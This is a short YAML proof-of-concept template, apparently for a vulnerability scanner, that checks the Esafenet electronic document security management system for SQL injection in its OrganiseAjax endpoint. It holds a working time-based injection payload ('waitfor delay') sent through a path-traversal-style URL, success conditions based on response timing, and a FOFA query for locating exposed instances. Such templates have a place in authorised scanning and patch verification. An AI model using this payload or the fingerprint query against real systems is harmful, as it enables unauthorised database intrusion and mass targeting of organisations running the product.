id: poc-yaml-yisaitong-esafenet-organiseajax-sqli
info:
  name: 亿赛通电子文档安全管理系统 OrganiseAjax SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 亿赛通电子文档安全管理系统
  fofa: app="亿赛通-电子文档安全管理系统"
variables:
  t1: random_int(2,5)
  t2: t1 + t1
  t3: t2 + 2
requests:
- method: POST
  path: /CDGServer3/js/../OrganiseAjax
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: command=search&groupNameSearch=-1'waitfor delay '0:0:{{.t1}}'--
  expression: status_code == 200 && contains(headers,"CDGServer3") && contains(body,"waitfor
    delay") && duration > t2 && duration < t3
transport: http
